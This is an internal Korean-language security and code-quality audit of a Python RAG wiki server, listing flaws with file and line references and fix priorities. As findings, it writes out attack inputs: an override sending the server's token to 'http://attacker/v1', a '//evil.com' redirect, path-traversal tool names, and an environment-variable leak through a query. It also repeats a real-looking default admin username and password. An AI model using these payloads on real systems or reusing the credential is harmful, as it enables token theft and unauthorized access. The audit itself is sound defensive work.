# 코드·문서 전수 분석 — 장점 · 단점 · 개선점 (2026-09-17)

> 목적: 현재 코드(파이썬 23,500줄 · 웹 4,200줄)와 문서(docs 39개 · 7,200줄)를 **파일 하나하나 정독**해
> 무엇이 잘 되어 있고, 무엇이 위험하며, 어디부터 손대야 하는지를 근거(`파일:줄`)와 함께 남긴다.
> 이 회차는 **분석만** 했다 — 코드·설정·문서는 바꾸지 않았다(이 문서와 README 색인 한 줄만 추가).
> 후속 구현은 이 문서의 §6 우선순위표를 따르고, 결과는 `IMPLEMENTATION_PLAN_<date>.md` 와 `BRINGUP_GUIDE.md` 에 적는다.

## 0. 한 장 요약

| 항목 | 값 |
|---|---|
| 정독 범위 | `llmwiki/*.py` 53개 · `web/static` 14개 · `tests/` 18개 · `tools/verify/` 21개 · 설정 13개 · `docs/` 39개 · `setup/` |
| 방법 | 7개 영역으로 나눠 전량 읽고, 상위 결함은 코드·실행으로 재확인(`health`, `unittest`, 스키마·설정 직접 대조) |
| 단위 테스트 | **240/240 통과** (104초, Python 3.14.7) — 단, ResourceWarning 423건 |
| `health` | fail 0 · warn 6 (자기 소스 색인 23% · hash 임베딩 · `llama3.1` 모델 미존재 4건) |
| 종합 평가 | **기능 폭과 설계 근거 기록은 매우 우수. 그러나 "여러 사람이 쓰는 사내 서버" 로 공개하기에는 보안 결함 5건이 먼저 막혀야 하고, 문서는 핵심 3개가 9/15 이후 갱신되지 않아 서로 모순된다.** |

### 즉시 조치가 필요한 것 (P0 — 서버 공개 전 필수)

| # | 무엇 | 어디 | 왜 위험한가 |
|---|---|---|---|
| 1 | **요청 단위 `overrides` 로 `openai_base_url` 을 바꿀 수 있다** | `config.py:518-555` `apply_overrides` 가 Settings 전 필드 허용 · `pipeline.py:78-79` 서명 키에 `openai_base_url` 포함 · `server.py:1265,1684` | **익명(viewer) 이 `/api/query` 에 `{"overrides":{"openai_base_url":"http://attacker/v1"}}` 를 보내면 서버가 `.env` 의 PAT 를 그 주소로 전송한다.** `corpus_dirs` 덮어쓰기로 임의 폴더 색인도 가능 |
| 2 | **`security.json` 에 기본 admin(`kh82.kim/1234qwer`)·테스트 잔여 계정·`op0~op7` 이 실려 있고 문서 3곳에 평문 비밀번호** | `security.json`, `security.json.bak`, README:189, `setup/INSTALL.md:17`, `BRINGUP_GUIDE.md:405` | 폴더째 복사가 배포 방식이므로 그대로 사내에 나간다. `.gitignore` 도 `security.json*`·`data/.session_secret`·`data/sessions.json` 을 제외하지 않는다 |
| 3 | **`mode: auto` 는 127.0.0.1 바인드면 로그인 off(전원 admin)** | `auth.py:490-493` | 사내 표준인 "리버스 프록시 뒤 127.0.0.1 바인드" 에서 프록시를 거친 모든 사용자가 admin 이 된다. 헤더 SSO 가 바로 이 토폴로지를 전제한다 |
| 4 | **500 응답에 스택트레이스 노출 + 서버 로그 무기록** · **read 등급 GET 이 로그·스케줄·소스 URL·agents 명령·설정 전체를 노출** | `server.py:512,952,1676` · `auth.py:349-352` GET admin 전용 5개뿐 · `/api/logs`, `/api/schedule`, `/api/mcp_sources`, `/api/agents`, `/api/status`, `/api/config/effective` | 게스트가 내부 경로·외부 소스 헤더·스케줄 스크립트 경로를 읽는다. 운영자는 500 을 볼 방법이 없다 |
| 5 | **MCP: `${ENV}` 치환 순서 · `expose:true` REST 경로 조작 · 잘못된 `params` 하나로 stdio 서버 종료** | `mcp_client.py:207-211` · `mcp.py:311-313`+`mcp_client.py:413` · `mcp.py:571,665` | 질의문 `"${MANGO_MCP_TOKEN}"` 으로 서버 환경변수가 다른 소스로 전송됨 · viewer 가 `kb_rest__../admin/purge` 호출 가능 · params 가 리스트면 프로세스 사망 |

### 데이터·운영 무결성 (P1)

| # | 무엇 | 어디 |
|---|---|---|
| 6 | **단위 테스트가 실제 `security.json` 을 오염시킨다** — `LLMWIKI_SECURITY`(정답은 `LLMWIKI_SECURITY_PATH`) 를 설정해 격리한 줄 알고 `op0~op7` 을 8스레드로 쓴다. `verify_docs 0916_2` 가 "지웠다" 고 적었으나 테스트를 돌릴 때마다 되살아난다 | `tests/test_concurrency_0915.py:1304` vs `config.py:39-43` |
| 7 | **Web 콘솔·스케줄 `cli` 가 프로세스 전역 `sys.stdout` 을 교체** → 동시 사용자 출력이 섞이고 유실 | `cli.py:2230`, `server.py:1448`, `scheduler.py:432` |
| 8 | **`evolve_auto_apply` 가 사용자 질의 도중 평가셋 2회 실행 + DB 파일 복사 + 재빌드를 동기로** 하고, 회귀 판정은 비결정 지표의 단순 부등호, 실패하면 DB 파일 스왑, 스냅샷 무한 축적 | `evolve.py:81-85,200-285,323` |
| 9 | **빌드 락 6시간 고정·하트비트 없음** → 긴 LLM 그래프 빌드 중 워처가 락을 회수해 동시 빌드 · Windows 타계정 PID 오판 | `buildlock.py:48,32-33,80-86` |
| 10 | **`entities_fts` 행 삭제가 전체 스캔(N²)** — `entity_id` UNINDEXED 인데 `DELETE … WHERE entity_id=?` 를 엔티티마다 | `store.py:40,884,719` (chunks_fts 에서 고친 것과 같은 유형) |
| 11 | **CLI 권한 게이트 우회** — `--log-level DEBUG build --full` 처럼 전역 옵션이 앞에 오면 `cmd="--log-level"` 로 분류돼 `edit` 등급 통과 · `schedule add` 가 CLI 에선 `edit`, 실행은 무게이트 | `cli.py:387`, `auth.py:330`, `scheduler.py:432` |
| 12 | **버전 관리·CI 부재** — git 저장소가 아니고, 어떤 자동 실행도 없다. "3.7 호환" 은 한 번도 검증된 적 없다(이 PC 에 3.7 없음) | 저장소 루트 |

---

## 1. 전체 강점 (지켜야 할 것)

1. **표준 라이브러리만으로 완결** — SQLite(FTS5+벡터 BLOB+그래프+로그) 단일 파일, `http.server` 기반 SPA, MCP 서버·클라이언트·브리지, OIDC/헤더 SSO, PBKDF2, 회로차단·재시도·취소까지 외부 의존 0. 폴더 복사가 곧 배포라는 목표에 정확히 맞는다.
2. **설정 외부화 원칙이 대체로 지켜짐** — `config/tuning/presets/server/schedule/models/security/agents/mcp_sources/query_rules/schemas/prompts` 가 파일이고 `setup/*.example.*` 과 `config show --effective`(출처 표시) 가 있다. `tuning.py` 레지스트리(범위·choices 검증·문서 자동 생성) 는 이 프로젝트에서 가장 잘 된 설정 모듈이다.
3. **관측 가능성** — 모든 질의 단계가 Profiler trace 로 남고, `rerun`(단계 재실행)·`forensic expect`(기대 문서 탈락 지점)·`analyze`(3렌즈 리포트)·`optimize`(LLM 에게 줄 묶음) 로 "왜 이런 답이 나왔나" 를 추적할 수 있다. 이 조합은 상용 RAG 제품에도 드물다.
4. **설계 근거가 코드와 문서에 남아 있음** — docstring 에 실측 수치와 "예전에는 무엇이 잘못됐나" 가 적혀 있고(`rerun.py`, `collab.py`, `evolve._usable_term`, `server.py:244-249`), IMPLEMENTATION_PLAN 은 버린 대안과 이유를 담는다.
5. **다중 사용자 기초** — 요청마다 설정 사본·전용 DB 연결·스레드 로컬 카운터(`request_scope`), RW락+슬롯+대기열+속도 제한(`reqmgr`), 서버 주도 확인 흐름(428 → 모달 → 재시도), 입력 정화(서러게이트·NUL·413).
6. **한국어·Windows 현장 문제를 정면으로 다룸** — 조사 제거·bigram·복합어·kiwi 폴백, 코드페이지 65001·`reconfigure`, `.cmd` 해석, `os.replace` 락, Content-Length 바이트 길이.
7. **검증 문화** — 단위 240 + CLI 222 + Web 307 + MCP 92 + 버튼 97 전수 하네스, `verify_docs.py` 로 문서↔코드 정합을 기계 검사, 실패를 일부러 일으키는 `verify_timeouts.py`.
8. **품질을 측정으로 판단** — QUALITY_REVIEW_0917 처럼 가설(`rrf_k` 가 레버다) 을 실측으로 기각하고 기본값을 근거 없이 바꾸지 않는 태도.

---

## 2. 영역별 분석

### 2.1 핵심 색인·검색 (`pipeline · store · retrieval · query_engine · corpus · textutil · graph_* · schema …`)

**강점** — 증분 빌드(rename 감지·임베딩 해시 캐시·재개·적응형 배치), 채널 독립 빌드, FTS 티어/PRF/bigram/trigram, 융합 5방식+부스트, `final_order` 로 리랭크 정렬 일원화, 근거 판정→fallback→claim 검사의 일관된 폴백.

**결함(영향 순)**

| # | 내용 | 위치 |
|---|---|---|
| 1 | `entities_fts` 행 단위 DELETE 전체 스캔 (P1-10) | `store.py:884,719`; `delete_doc` 348 도 doc_id UNINDEXED |
| 2 | 빌드 락 하트비트 없음·6h 고정·Windows 타계정 PID 오판·락 파일 작성 중 읽기 경쟁 (P1-9) | `buildlock.py:48,32-33,80-86` |
| 3 | 문서 유형 추론 glob `*cl*/*`, `*tc*/*` 가 `include/`, `clock/`, `etc/` 에 매칭 → 전 문서가 `cl`/`tc_list` 로 오분류되어 링크 규칙·부스트·lint 가 틀어짐. **이식 시 최우선 점검** | `schema.py:98,103`, `schemas/infer.json` |
| 4 | 별칭 정규식에 단어 경계 없음 → `IR`·`PA`·`AMD` 가 `IRQ`·`PATH`·`AMDGPU` 안에서 매칭 (query_rules 는 경계 있음) | `graph_rules.py:255` |
| 5 | 한국어: 단음절 조사를 3자 이상 토큰 끝에서 무조건 제거(`가속도→가속`, `정확도→정확`, `안테나→안테`); bigram 접두 `_` 가 unicode61 에서 구분자로 소실되어 실제 2음절어와 충돌; `0x3F` 가 `0`/`x3f` 로 분리 | `textutil.py:24-30,145,20` |
| 6 | `build(channels=…)`·`precompute.run` 이 **전역 toggles 를 직접 변경** → 요청 범위 밖(워처·CLI) 호출 시 다른 사용자의 질의 설정이 바뀜 | `pipeline.py:478-493`, `precompute.py:119-136` |
| 7 | 빌드 중간 실패 시 DB 는 바뀌었는데 `build_version` 미증가 → 다른 프로세스 캐시 stale | `pipeline.py:635` vs `792` |
| 8 | 질의마다 사전 항목 수만큼 `re.compile`(자가진화로 사전이 커질수록 지연 증가), 전 엔티티 `n in ql` 순회, `deg` 맵 재생성 | `query_rules.py:130-138`, `retrieval.py:83-87,234`, `query_engine.py:819` |
| 9 | 비원자 파일 쓰기: pins(질의마다 read-modify-write), prompts, wiki — `atomicio` 의 존재 이유와 충돌 | `pins.py:41-47,130-140`, `prompts.py:196-213`, `wiki.py` |
| 10 | 도메인 값 하드코딩: 문서 ID 접두 정규식 3중복(`answer.py:230,397`, `evidence.py:19`), 관계 이름(`graph_build.py:69,74`), 융합 상수(`fusion.py:55,112,128`), rerank timeout 120s(`rerankers.py:28`), `EXCLUDE_DIRS`·`.claude`(`corpus.py:24,213`), `DEFAULT_RULES` 가 반도체·증권 도메인(`graph_rules.py:37-90`) |
| 11 | 빌드 전체를 죽이는 입력: `schema_version: v1` → `int()` ValueError(`schema.py:527`); `chunk_overlap_chars >= chunk_max_chars` → 무한 루프(`corpus.py:330-333`) |
| 12 | `vector_matrix` 가 첫 행 dim 과 다른 행을 조용히 버림(`store.py:843-844`); `entities(limit=100000)` 조용한 절단(`918`); `_query_legacy`(148줄)·`rrf_fuse` 는 호출처 없는 죽은 코드(`pipeline.py:1141`, `retrieval.py:353`) |
| 13 | 규모: LLM 그래프 추출이 청크당 순차 1회(3만 청크 ≈ 17시간), `write_wiki` 엔티티당 ~45 쿼리, `graph_export` 관계 전체 적재, `_match_entities`·`compound_parts` O(토큰×사전) | `graph_build.py:92-138`, `wiki.py:41-63`, `pipeline.py:1344`, `textutil.py:106-109` |
| 14 | `split_claims` 가 `lstrip("-*•0123456789. ")` 로 문장 앞 날짜·수치·`0x3F` 를 지워 claim 오판정; `_NONFACT` 에 `?` 포함 | `answer.py:248,232` |
| 15 | `precompute._norm_q` 가 키워드 집합으로 정규화 → 어순이 다른 질문이 같은 캐시; 키워드 나열 문자열을 질문으로 실행해 저장 | `precompute.py:24-25,118` |
| 16 | `snapshots.py` 가 query_rules/pins/tuning/prompts/schemas 를 포함하지 않아 자가진화 산출물이 복원되지 않음; `evolve._snapshot` 은 별개의 두 번째 스냅샷 구현 | `snapshots.py:35-43`, `evolve.py:323` |
| 17 | `timeparse.from_ts/to_ts` 가 서버 로컬 TZ, `today` 는 설정 TZ → 서버 TZ≠Asia/Seoul 이면 경계 어긋남; `v2026.1.2` 같은 버전 문자열을 날짜로 인식 | `timeparse.py:151,67` |

**구조 관찰** — `pipeline.py` 1,470줄 한 클래스(빌드·질의·평가·유지보수), `_build`/`_build_channel` finally 블록 60여 줄 복제, `query_engine.run` 400줄에 replay 분기가 5곳에 흩어짐, `store.py` 1,265줄 한 클래스. 빌드 오케스트레이션을 `build_engine.py` 로, 질의를 Plan/Retrieve/Assess/Answer 객체로 나누면 테스트 가능성이 오른다.

### 2.2 설정 · 프로바이더 · 인증 (`config · providers · headless · auth · health · logging_setup …`)

**강점** — `Settings` dataclass 가 CLI/Web/env 이름의 단일 원천, `SETTING_SOURCES` 출처 추적, 역할별 LLM 정책 상속, transient/non-transient 오류 분리, 취소 가능한 sleep, 회로차단, `hmac.compare_digest` 를 비밀번호·API 키·state·nonce 전부에 사용, 토큰은 해시만 저장, 미리보기 쿠키는 권한을 낮추기만.

**결함(영향 순)**

| # | 내용 | 위치 |
|---|---|---|
| 1 | 기본 admin 자격증명 배포 + `.gitignore` 누락 (P0-2) | `security.json`, `.gitignore` |
| 2 | `mode: auto` + 127.0.0.1 = 인증 off (P0-3) | `auth.py:490-493` |
| 3 | headless 자식 프로세스에 **전체 환경변수(PAT·`LLMWIKI_PASSWORD`·OIDC secret) 전달**, 프롬프트(코퍼스 발췌 14,000자+)를 **argv** 로 전달(프로세스 목록 노출·Windows 32K 한계), 로그에 argv 앞부분 기록 | `headless.py:428-429,58,385-389,487,499` |
| 4 | OIDC: PKCE 없음, id_token 서명 검증은 PyJWT 있을 때만, nonce 는 토큰에 없으면 통과, `allowed_domains` 는 email 없으면 우회 | `auth.py:768-829,810,824,1139-1152` |
| 5 | 프록시 IP 미해석(`X-Forwarded-For` 무시) → 프록시 뒤에서 per-IP 제한·차단·감사 IP 가 전부 프록시 IP; `trusted_proxies` CIDR 불가; `X-Forwarded-Proto` 는 누구나 보낼 수 있어 Secure 쿠키 플래그가 클라이언트 제어 | `server.py:272,307`, `auth.py:723` |
| 6 | 로그인 무차별 대입: `sleep(0.5)` 뿐, 계정 잠금 없음; 로그아웃이 토큰을 무효화하지 못함(`sessions.enforce` 기본 false); 세션 회전 없음 | `server.py:980`, `auth.py:707` |
| 7 | CSRF Origin 검사가 포트 무시 + `localhost`/`127.0.0.1` 항상 허용; 오픈 리다이렉트 `//evil.com` 통과 | `auth.py:893-903`, `server.py:541` |
| 8 | LLM 호출 최악 지연: 외부 재시도(1+3)×HTTP 재시도(1+2)=12회 × `llm_timeout 600s`, `llm_budget_s` 기본 0 → 이론상 2시간; 내부 `time.sleep(1.5*(attempt+1))` 은 취소 불가·지터 없음; **409 를 transient 로 재시도** | `providers.py:487-497,741-742,495,740` |
| 9 | 공유 프로바이더 인스턴스의 가변 상태: `live_test` 가 `timeout/retries` 를 임시 변경(동시 질의가 `retries=0` 으로 실행), `_files` 에 요청 데이터 저장(동시 요청 간 첨부 섞임) | `providers.py:294-309,186` |
| 10 | Settings 무검증: `LLMWIKI_TOP_K_FTS=abc` 로 서버 기동 실패, 알 수 없는 키 조용히 무시, 모든 list 필드에 경로 해석 적용 → `corpus_exclude` 패턴이 절대경로로 변해 제외 규칙 파괴 가능 | `config.py:540-547,403-404` |
| 11 | 임베더(Voyage/Ollama/OpenAI) 재시도 없음·배치 64/32·타임아웃 120/600 하드코딩(`embed_batch` 무시); Anthropic 경로 `extra_headers` 미지원(사내 게이트웨이 고정 헤더 불가); json_mode 폴백이 `"400" in str(e)` 문자열 매칭 후 영구 비활성화; 스트리밍 없음 | `providers.py:984-1080,875-884,710-713` |
| 12 | `RotatingFileHandler` 는 다중 프로세스(서버+CLI 빌드+스케줄러)에 안전하지 않음(Windows rename PermissionError); `audit.jsonl` 무한 append; `_secret` chmod 는 Windows no-op | `logging_setup.py:107`, `auth.py:1045-1059` |
| 13 | 설정 드리프트: 루트 `config.json`(`llama3.1` 미존재 모델·`auto_build 30s`) vs `setup/config.example.json`(예제에 `corpus_exclude`·`rerun_*`·`rerun_capture`·`analysis_mode` 없음); 루트 `server.json` 에 `collab` 절 없음; `agents.json` stall 키 없음; `mcp_sources.json:196` 에 **절대 경로 `C:\Users\user\...\python.exe`** 고정; Python 최소 버전이 3곳에서 다름(`requirements.txt` 3.7 / `check_env.py` 3.9 / `INSTALL.md` 3.9) | 각 파일 |
| 14 | `.env` 의 `PYTHONIOENCODING` 은 이미 기동한 인터프리터에 효과 없음(주석이 오해 유발); `config.json` 없으면 예제 자동 복사 → 예제의 샘플 코퍼스가 운영 설정이 되는 경로 | `config.py:50-66,469-470` |
| 15 | mock 프로바이더가 `TASK=verify/claim/route` 프롬프트에 JSON 이 아닌 텍스트를 내 검증 단계 배선을 mock 으로 확인 불가 | `providers.py:391-394` |

### 2.3 웹 서버 · 프론트엔드 (`web/server.py · static/js/*`)

**강점** — 인가 경계가 두 곳(`_do_post:1010-1019`, `_do_get:550-553`)에 모여 있고 미등록 POST 는 `edit` 기본(안전한 방향), 폴링을 락 밖에 둔 이유가 주석에, keep-alive 근거, 잡 취소 경쟁 처리, 프론트 `esc()` 가 173곳 중 대부분에 적용, 세션은 HttpOnly 쿠키(localStorage 에 토큰 없음), 활동 폴링 구독 모델.

**결함(영향 순)**

| # | 내용 | 위치 |
|---|---|---|
| 1 | overrides 로 LLM base URL 변경 → PAT 유출·SSRF (P0-1) | `server.py:1265,1684,1738` |
| 2 | 500 트레이스 노출·무기록 (P0-4) | `server.py:512,952,1676,252-257` |
| 3 | read 등급 GET 과다 노출 (P0-4); `/api/queries`·`/api/query_trace` 는 `/api/requests` 와 달리 사용자 범위 제한이 없어 남의 질의 원문 열람 | `auth.py:349-352`, `server.py:654-658` |
| 4 | `_body()` 가 잘못된 JSON 을 **빈 요청** 으로 통과 → `/api/config` 에 깨진 JSON 이 "성공" 으로 감사 기록 | `server.py:353-356` |
| 5 | 보안 헤더 전무(CSP·X-Frame-Options·nosniff·Referrer-Policy) + 정적 파일 `no-store` 로 매 로드 330KB JS 재전송 | `server.py:324-336,358-371` |
| 6 | GET 경로 순회: `wiki/page?name=../../x`, `logs?file=../x` (확장자 강제로 피해 제한); `_static` prefix 검사가 `STATIC + os.sep` 아님 | `server.py:778,813,360` |
| 7 | 로그인이 읽기 슬롯을 잡음 → `reads_during_build=never` 전체 리빌드 중 아무도 로그인 불가 | `server.py:973` |
| 8 | `_JOBS` dict 를 락 없이 양쪽에서 변경(드문 `dictionary changed size`); `/api/status` 응답에 모든 잡의 log 배열이 2초마다 전송; 완료 잡 result 50개 메모리 상주 | `server.py:384,1732,393,1703` |
| 9 | `do_DELETE` 가 authorize·CSRF·check_access·try/except 없이 진행 | `server.py:473-490` |
| 10 | 프론트: 오류 객체 무방어(`DOCS.filter`, `TRIALS.map`, `pollJob(undefined)` → 취소/거부 시 화면이 조용히 죽음) | `corpus.js:92-96`, `quality.js:9-11,18`, `evolve.js:9-11` |
| 11 | 프론트에 서버 진실 복제: 역할 목록(`index.html:22,567`), 로그 파일명(`667`), `LIMIT_HELP`(`observability.js:397-421`), `ACTION_SAMPLE`(`settings.js:405-425`), **코퍼스 종속 예시 질문** `SAMPLES`(`ask.js:6`) — 이식 시 코드 수정 필요 |
| 12 | LLM 산출물 미이스케이프 XSS: 엔티티 `type/source/community`(`knowledge.js:15,70`), `doc_types`·`boosts`(`ask.js:77,144,153`), `r.kind`(`observability.js:14,24`), `settings.js:343,346`, `login.html:50-52` |
| 13 | `confirm()/prompt()` 16곳(settings.js 10곳 포함) — "등급표 + 서버 주도 확인" 원칙과 어긋남; `prompt()` 로 타인 비밀번호 입력(마스킹 없음) | `settings.js:293` 외 |
| 14 | collab 1초 폴링이 `document.hidden` 미확인(백그라운드 탭 30개 = 초당 30요청); 삭제를 `remove_mine`→`remove` 2회 호출해 403 토스트 항상 발생 | `collab.js:23,199-200` |
| 15 | 하드코딩: 무차별 대입 지연 0.5s, 잡 보관 50, 폴링 2000/500/700/1000ms, `HEAVY_GET` 목록, 조회 limit 들 | `server.py:980,1703,515`, `core.js:942,542,568` |

**구조 관찰** — `_do_get` 420줄·`_dispatch_post` 340줄 if-체인 → 라우팅 표(path → handler, level, weight) 로 바꾸면 `HEAVY_GET`·`classify_api`·`weight_for_level` 이 한 곳에 모인다. 모듈 간 결합이 런타임 몽키패치(`LW.renderResult` 등을 `LW.x && LW.x()` 로 방어 호출) 라 로드 순서 의존.

### 2.4 CLI · 스케줄러 · 자가진화 · 분석 · 협업

**강점** — CLI=Web=스케줄러=MCP 가 한 argparse·한 권한 표·한 파이프라인 공유, 파괴적 작업 확인 문구·`--yes`·비대화형 거부, 자체 cron 구현이 간결하고 로드 시 검증, `DEFAULTS` 주석이 곧 문서(`reqmgr`), rerun 의 replay 설계 근거, `_usable_term` 로 숫자·날짜 동의어 오염 방지.

**결함(영향 순)**

| # | 내용 | 위치 |
|---|---|---|
| 1 | 전역 `redirect_stdout` (P1-7) | `cli.py:2230,2220,2228` |
| 2 | `evolve_auto_apply` 질의 경로 동기 실행·회귀 판정·DB 스왑·스냅샷 축적 (P1-8); `llm_insight` 가 LLM 이 준 키를 검증 없이 tuning 제안으로 등록 → `unknown tunable` 로 apply 실패 → DB 파일 스왑 롤백 | `evolve.py:81-85,272,281-285,323`, `analysis.py:853` |
| 3 | CLI 게이트 우회·불일치 (P1-11); `rerun`(읽기 전용)이 `edit`; 스케줄러 client 가 항상 `builder` 인데 `purge_requests`·`auto_apply`·임의 `cli` 실행 | `cli.py:387`, `auth.py:330`, `scheduler.py:432,719` |
| 4 | 스케줄러: `overlap` 은 `skip` 만 구현(다른 값은 동시 실행 + `running` 덮어쓰기); 서버 재시작 시 놓친 cron 은 다음날까지 안 돎(catch-up 없음); `zoneinfo` 실패 시 조용히 naive 로컬 시각; 빌드 실패가 이력에 `done`; CLI `schedule run` 이 실행 중 서버의 `schedule_state.json` 을 덮어씀 | `scheduler.py:704,260,234,361-368,637,664` |
| 5 | 요청 관리자: 슬롯이 비FIFO(`notify_all` 후 아무 스레드) → 부하 시 오래 기다린 요청이 계속 밀려 503; `_rate`/`clients` 키별 무한 성장(정리 없음); soft 쓰기 대기 중 읽기 전면 차단; `release_write` 소유자 검사 없음 | `reqmgr.py:637-651,375-376,217,267` |
| 6 | collab: `say()` 가 ip 없이 `touch` → 채팅마다 아이콘 두 번 바뀌고 rev 최적화 무력화; 게시판 `load→수정→save` 락 없음(동시 게시 시 한쪽 유실); 게시마다 새 SQLite 연결 생성 후 미닫음 | `collab.py:125,160-180,251-313,282` |
| 7 | `_run_cmd` 1,350줄 단일 함수; 설정 저장/복원이 trials·forensic·cli 프리셋 3중 복제(`request_scope` 하나로 대체 가능); 종료 코드 상수 없음(`rerun` 사용 오류 2, 문서 표에 4·5 누락) | `cli.py:599-1951`, `trials.py:42-48,98-108`, `forensic.py:347-381` |
| 8 | 평가셋: "지난주 주간 보고" 문항이 실행 날짜 의존(2026-09-17 이후 기대 문서 틀림); `expect_docs` 부분 문자열 매칭(`ISSUE-200` 이 2001~2009 전부 적중); `load_questions` 가 파일을 생성하는 부수효과; `DEFAULT_QUESTIONS` 가 반도체 도메인 잔재; 질문셋이 두 곳에 복제 | `eval/questions.json:85`, `evalset.py:45,65,14` |
| 9 | forensic/analysis 임계값 9종 하드코딩(0.15/0.95/0.05/300/1.5/2000/0.5, 15/40%, 20/50%, 1500ms); `get_forensic` 이 5,000행 읽고 JSON 3열 파싱해 하나 찾음; `build_report` 마다 전체 COUNT 5회 | `forensic.py:64-135,165`, `analysis.py:391-437,138` |
| 10 | 죽은 코드·잡음: `schedule run` 의 `with cli_monitor(enabled=False): pass`, `__import__("time")` 8곳, `analysis.plan_pins`, `LLM_STAGES`, `optimize._INTRO "토글 (59개)"` 고정 문자열 | `cli.py:2185`, `analysis.py:27,351`, `optimize.py:50` |

### 2.5 MCP (`mcp.py · mcp_client.py · plugins/`)

**강점** — stdio 두 프레이밍(줄/Content-Length 바이트 정확), Streamable HTTP JSON 모드(세션 ID·202·405), 버전 협상, `validate_args` 의 사람이 읽는 오류, `isError` 일관, 플러그인 실패 격리, 재귀 방지, `--doctor`. MCP.md 는 코드와 정확히 일치하는 유일한 문서.

**결함(영향 순)**

| # | 내용 | 위치 |
|---|---|---|
| 1 | `params` 가 dict 가 아니면 stdio 서버 종료 · HTTP 는 JSON-RPC 아닌 500 (P0-5) | `mcp.py:571,650-665,710` |
| 2 | `expose:true` 허용 목록 부재 + REST `base + "/" + name` 경로 조작 (P0-5) | `mcp.py:311-313`, `mcp_client.py:413` |
| 3 | `${ENV}` 치환이 `{query}` 삽입 **뒤에** 실행 → 질의문으로 서버 비밀 유출 (P0-5) | `mcp_client.py:207-211` |
| 4 | stdio 자식 stderr 미배출(파이프 가득 차면 양쪽 정지) + `readline` 블로킹으로 타임아웃 미보장 → 서버 스레드 영구 대기 | `mcp_client.py:253,276-277` |
| 5 | 공식 MCP SDK 서버와 페더레이션 불가: `Accept: application/json` 만 보내고 SSE 응답 미처리, `MCP-Protocol-Version` 헤더 없음 → **llmwiki 끼리만 붙는다** | `mcp.py:760`, `mcp_client.py:358-381` |
| 6 | 플러그인·원격 도구의 `annotations/title` 을 버림 → 원격의 `destructiveHint` 가 사라진 채 노출(문서는 "그대로 쓴다") | `mcp.py:137,199-200` |
| 7 | `_PLUGIN_TOOLS.clear()` 무락(`dictionary changed size`), 매 요청 `os.listdir`+`getmtime`, `_FED_CACHE` 무락·TTL 300 하드코딩, 만료 후 죽은 소스마다 60초 동기 대기, tools/list 에 티켓 없음(속도 제한 없음), 풀 락 안에서 `start()` | `mcp.py:155,231,180`, `server.py:444`, `mcp_client.py:462-470` |
| 8 | Windows stdin 인코딩(`stdout` 만 reconfigure), Content-Length 파싱 실패 후 스트림 불일치, `k`/`max_chars` 상한 없음, 서버→클라이언트 요청 무시 | `mcp.py:644-648,617,387,406,440`, `mcp_client.py:288` |
| 9 | 플러그인 폴더 = 코드 실행 권한(문서에 폴더 권한 미명시); 루트 `mcp_sources.json` 절대 경로 | `plugins/`, `mcp_sources.json:196` |

### 2.6 테스트 · 검증 하네스

**강점** — 240개 실제 단언 위주 통합 테스트, 네트워크 없이 결정적(mock LLM·hash 임베딩·가짜 IdP/API/MCP·포트 0), 실사용 사고를 회귀로 고정(서러게이트·원자적 저장·큐 독점·반복 루프), 테스트마다 "왜 있나" 주석, `verify_docs/surface_align/ui_wiring` 정적 정합 검사.

**결함(영향 순)**

| # | 내용 | 위치 |
|---|---|---|
| 1 | CI·버전관리 부재, 3.7 미검증 (P1-12) | — |
| 2 | 실제 `security.json` 오염 (P1-6); `test_console_0915` 가 격리 없이 실제 `config.json`/색인으로 subprocess 실행; 일부 `LOGS_DIR` 미격리 | `test_concurrency_0915.py:1304`, `test_console_0915.py` |
| 3 | `verify_web.py:152` 에 **실제 admin 자격증명 `kh82.kim/1234qwer` 하드코딩** → 비밀번호 바꾸면 하네스 깨짐 | `tools/verify/verify_web.py:152` |
| 4 | 결과 JSON 11개(190KB)+PNG 2개(290KB) 체크인 + `verify_all` 이 `VERIFICATION_0917.md` 표를 직접 덮어씀; 현재 저장본은 `--quick` 8종 부분 실행분(문서는 21종 주장) | `tools/verify/*_result.json` |
| 5 | `verify_monkey` 가 폭격 후 정상 질의 2/23·`healthy_after=false`·`queue_full 64` 인데 activity 0(대기열 카운터 누수 의심) 인데도 `RESULT OK` | `verify_monkey.py:535` |
| 6 | ResourceWarning 423건: `store.py` 38(닫히지 않은 sqlite 연결)·`profiler.py` 27·테스트 `open().write()` 미닫음 — 제품 코드 결함 신호 | 실행 로그 |
| 7 | 날짜 접미 파일명(`test_features_0914`, `test_review_0917` …) → `mcp` 는 6개 파일, `auth` 는 5개 파일에 분산; 픽스처(`_gen_corpus`, `_Base`, FakeLLM) 7곳 복붙 | `tests/` |
| 8 | 직접 단위 테스트 없는 모듈: `query_engine`(64KB), `graph_build`, `embed_run`, `evidence`, `wiki`, `snapshots`, `graph_llm`, `profiles`; `store`·`server` 는 HTTP 로만 | — |
| 9 | setUp 마다 코퍼스 생성+전체 빌드(240개 105초, 선형 증가); 시간 기반 단언 다수(`<3s`, `timeout=0.3`) → 느린 CI 에서 flaky | `test_concurrency_0015.py` 등 |
| 10 | 하네스: 포트 8792~8877 스크립트마다 상수, 격리 env 블록 3벌 복제, 브라우저 없으면 7종이 SKIP=성공, Windows Edge 우선 | `tools/verify/` |

### 2.7 문서

**강점** — README §0 "목적별 읽는 순서" 표, BRINGUP §2.2/§2.3(색인 이식·타임스탬프·`embed_provider=auto` 함정)·§4.1~4.3(PAT/headless), CONCURRENCY·SCHEDULER·MCP·FORENSIC·ANALYSIS_MODE·RERUN 은 코드와 정확히 맞고 "증상→원인→조치" 표를 갖춤. 설계 대안과 기각 이유가 남아 있음. 실측 출력을 붙이는 관행.

**결함(영향 순)**

| # | 내용 |
|---|---|
| 1 | **핵심 3문서(ARCHITECTURE_V3 · CLI_FLOWS · IMPLEMENTATION_PLAN_0914)가 9/15 오전 이후 미갱신** — 요청 관리자·요청 이력·rerun·협업·MCP 14도구가 없고, "서버 전역 RLock 직렬화" 라는 옛 구조가 ARCH_V3 §8·MCP.md §1.2/§5·SECURITY §3/§9·IMPL_0914 §2.1·BRINGUP §4.6 에 남아 CONCURRENCY.md 와 **모순** |
| 2 | **수치 자기모순**: MCP 도구 수가 7/9/11/12/14(코드 14, MCP.md 만 정확), 토글 56/59/63(코드 63), 단위 테스트 87/148/163/181/240, Web 검증 210~307, 버튼 76/90/99/105 |
